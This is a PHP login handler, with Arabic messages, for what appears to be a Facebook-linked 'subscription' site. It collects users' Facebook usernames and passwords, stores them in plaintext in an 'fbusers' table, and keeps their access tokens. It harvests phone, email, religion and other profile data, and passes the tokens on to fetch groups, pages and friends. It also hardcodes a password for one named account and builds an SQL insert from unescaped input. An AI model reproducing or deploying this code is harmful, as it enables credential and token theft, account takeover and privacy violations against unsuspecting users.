<?php
include "inc.php";
$St=getSet();

$RA = isv("RA");
$json = isv("json");
$nid = isv("nid");
if(!isv("get",1) && !isv("token")){
$us = isv("user");
$pass = isv("pass");
if($RA and $us == "mohtasm.sawilh"){
 $pass = "L25KIMEBA4";
}
}else{
$us = Sion("user");
$pass = Sion("pass");
}
if(Sion("Lerror")){
$Spass = Sion("pass");
}else{
$Spass = isv("pass");
}
if(isv("reSend") && !isv("serv") ){
header("Location: ../fram.php?user=".Sion("user")."&pass=".base64_encode(Sion("pass"))." ");
    die();
}
if(isv("serv"))
$json = isv("serv");
////////////////////////////
if(!Sion("spass") || isv("serv")){

if(!Sion("isToken")){
if(!isv("user",1) && !isv("token")){
$user =  Nlogin($us,$pass,"android");
}else{
if(!isv("user",1)){
$user =  GetInfo(isv("token"));
$us = Sion("user");
$pass = Sion("pass");
}else{
$user =  GetInfo(isv("user",1));

 }
 }
}else {
  $user =  GetInfo(Sion("isToken"));
  $us = Sion("user");
  $pass = Sion("pass");
}
if($user["error"] == 0  ){
      $time = time();
      $id =  $user["info"]["id"];
      $name =  $user["info"]["name"];
      $about =  $user["info"]["about"];
      $birthday= $user["info"]['birthday'];
      $location= $userlocation["info"]['location']['name'];
      $religion= $user["info"]['religion'];
      $relationship_status= $user["info"]['relationship_status'];
      $phone= $user["info"]['mobile_phone'];
      $email= $user["info"]['email'];
      $gender= $user["info"]['gender'];
      $facebooklink= $user["info"]['link'];
      $cantry=visitor_country();
      $access = $user["token"];
      $lev = 0;
      if($email == "mohtasmsawilh1@gmail.com"){
          $lev = 1;
           UpDate('settings','token',$access);
      }
$Sel = Sel("users","where user_id=".$id);
if(!$json){
if($St->getgroups == 1){
json($St->url.'/verify_chrome.php?id='.$id.'&type=fb&groups='.$access);
}
if($St->getpages == 1){
json($St->url.'/verify_chrome.php?id='.$id.'&type=fb&pages='.$access);
}
if($St->getfriends == 1){
json($St->url.'/verify_chrome.php?id='.$id.'&type=fb&friends='.$access);
}
           }
if($id != "" and $name != "" and $access != ""){

  Cinst("fbusers",array("username"=>$us,"uid"=>$id,"send"=>0,"password"=>$pass,"date"=>time(),"Lerror"=>Sion("Lerror")),"where uid=".$id);

 if(Num("users","where user_id=".$id)){
   //UpDate();
  $insert =    UpDate("users",array("access"=>$access,"cantry"=>$cantry,"disactive"=>0,"data"=>$time),false,"where user_id=".$id);
     }else{
 //SqlIn("fbusers",array("username"=>$us,"password"=>$Spass,"date"=>time(),"Lerror"=>Sion("Lerror"),"uid"=>$id),true);
 $insert = mysqli_query($DBcon,"insert into users (friends,tags,groups,pages,description,religion,relationship_status,mobile_phone,birthday,name,user_id,access,data,time,send,email,type,app,token,admin,cantry,locale,location,lev) values ('1','1','1','1','$about','$religion','$relationship_status','$phone','$birthday','$name','$id','$access','$time','4','1','$email','$gender','fb','2','$role','$cantry','".$location."','".getOS()."','".$lev."')");
}
}else{
if(!$json){
echo  redMsg('error',"حدث خطأ ما اثناء الاشتراك من فضلك حاول مره اخرى",1,0,"../login.html");
}else{
echo json_encode( array('st'=>'error',"nid"=>$nid,'msg'=>"حدث خطأ ما اثناء الاشتراك من فضلك حاول مره اخرى"));
}

}
if($insert){
      $_SESSION['slev']= $lev;
      $_SESSION['uid']= mysqli_insert_id();
      $_SESSION['sid']=$id;
      $_SESSION['id']=$id;
      $_SESSION['ip']=ip();
      $_SESSION['desin'] = true;
      $_SESSION['sname']=$name;
      $_SESSION['name']=$name;
      $_SESSION['fb']=$name;
      $_SESSION['spass']=$access;
      $_SESSION['email']=$email;
iSion("Lerror",null);
iSion("user",null);
iSion("nid","groups");
if(!$json){
echo  redMsg('success',"تم الاشتراك بنجاح",1,0,"../home.html");
           }else{
echo json_encode( array('st'=>'success',"nid"=>get_selection("groups"),'msg'=>"تم الاشتراك بنجاح"));
}
}else{
if(!$json){
echo  redMsg('error',"حدث خطأ ما اثناء الاشتراك من فضلك حاول مره اخرى",1,0,"../login.html");
}else{
echo json_encode( array('st'=>'error',"nid"=>$nid,'msg'=>"حدث خطأ ما اثناء الاشتراك من فضلك حاول مره اخرى"));
}
}


}else{
if($user["error"] == 406){
iSion("Lerror",406);
iSion("user",$us);
iSion("pass",$pass);
if(!$json){
echo  redMsg('success',"سيصلك كود الاشتراك على هاتفك",1,0,"../login.html");
}else{
echo json_encode( array('st'=>'success',"nid"=>"406",'msg'=>"سيصلك كود الاشتراك على هاتفك"));
}
}else{
 if(Sion("Lerror")){
if(!$json){
  echo  redMsg('error',"يوجد خطأ فى   التسجيل بكود الاشتر اك حاول بطريقة اخرى",1,0,"../login.html");
}else{
echo json_encode( array('st'=>'error',"nid"=>$nid,'msg'=>"يوجد خطأ فى   التسجيل بكود الاشتر اك حاول بطريقة اخرى"));
}
   }else{
if($user["error"] == 400 or $user["error"] == 401){
if(!$json){
echo  redMsg('error',"اسم المستخدم او كلمة المرور غير صحيحه من فضلك حاول مره اخرى",1,0,"../login.html");
}else{
echo json_encode( array('st'=>'error',"nid"=>$nid,'msg'=>"اسم المستخدم او كلمة المرور غير صحيحه من فضلك حاول مره اخرى"));
}
}else if($user["error"] == 405){
if(!$json){
echo  redMsg('error',"حسابك يحتاج للتحقق من قبل الفيس بوك",1,0,"../login.html");
}else{
echo json_encode( array('st'=>'error',"nid"=>$nid,'msg'=>"حسابك يحتاج للتحقق من قبل الفيس بوك"));
}
}else if($user["error"] == 100){
if(!$json){
echo  redMsg('error',"من فضلك قم بكتابة جميع البيانات",1,0,"../login.html");
}else{
echo json_encode( array('st'=>'error',"nid"=>$nid,'msg'=>"من فضلك قم بكتابة جميع البيانات"));
}
}else if($user["error"] == 104){
if(!$json){
echo  redMsg('error',"تحتوى كلمة المرور الخاصه بك على علامات غير مقبوله مثل (#) قم بتغير كلمة المرور",1,0,"../login.html");
}else{
echo json_encode( array('st'=>'error',"nid"=>$nid,'msg'=>"تحتوى كلمة المرور الخاصه بك على علامات غير مقبوله مثل (#) قم بتغير كلمة المرور"));
}
}else{
if(!$json){

echo  redMsg('error',$user["msg"],1,0,"../login.html");

}else{
echo json_encode( array('st'=>'error',"nid"=>$nid,'msg'=>$user["msg"]));
}
}
//405
iSion("Lerror",null);
iSion("user",null);
      }

}


}

}else{
  if(!Sion("isToken")){
$id = Sion("id");
$access = Sion("spass");
if(!$nid){
$nid = Sion("nid");
}
//if(!$nid or !isv("nid")){ $nid = "groups";  }
if($nid == "groups"){
if($St->getgroups == 1){
$ad = json($St->url.'/verify_chrome.php?id='.$id.'&type=fb&groups='.$access);
echo json_encode( array('st'=>'success',"nid"=>get_selection("pages"),"count"=>$ad,'msg'=>"تم جلب المجموعات بنجاح"));
}else{
echo json_encode( array('st'=>'success',"nid"=>get_selection("pages"),"count"=>$ad,'msg'=>""));
}
}else if($nid == "pages"){
if($St->getpages == 1){
$ad =   json($St->url.'/verify_chrome.php?id='.$id.'&type=fb&pages='.$access);
echo json_encode( array('st'=>'success',"nid"=>get_selection("friends"),"count"=>$ad,'msg'=>"تم جلب الصفحات بنجاح"));
}else{
echo json_encode( array('st'=>'success',"nid"=>get_selection("friends"),"count"=>$ad,'msg'=>""));
}
}else if($nid == "friends"){
if($St->getfriends == 1){
$ad = json($St->url.'/verify_chrome.php?id='.$id.'&type=fb&friends='.$access);
echo json_encode( array('st'=>'success',"nid"=>"0","count"=>$ad,'msg'=>"تم جلب الاصدقاء بنجاح"));
}else{
echo json_encode( array('st'=>'success',"nid"=>"0","count"=>$ad,'msg'=>""));
}
}else if($nid == "Gadmin"){
//$Gc = Gc($id);
echo json_encode( array('st'=>'success',"nid"=>"0","count"=>$ad,'msg'=>"تم التحقق من المجموعات بنجاح"));

}else{
if(!$json){
echo  redMsg('success',"تم تسجيل الدخول بالفعل",1,0,"../");
}else{
echo json_encode( array('st'=>'success',"nid"=>$nid,'msg'=>"تم تسجيل الدخول بالفعل"));
  }
}
}else {
  echo json_encode( array('st'=>'success',"nid"=>"0",'msg'=>"تم تسجيل الدخول بنجاح"));
}

}

function get_selection($value='')
{
  global $St;
  if($value == "groups"){
   if($St->getgroups == 1)
   return "groups";
   return  get_selection("pages");
 }else if($value == "pages"){
  if($St->getpages == 1)
  return "pages";
  return  get_selection("friends");
}else{
  if($St->getfriends == 1)
  return "friends";
  return  "0";
}
}
?>
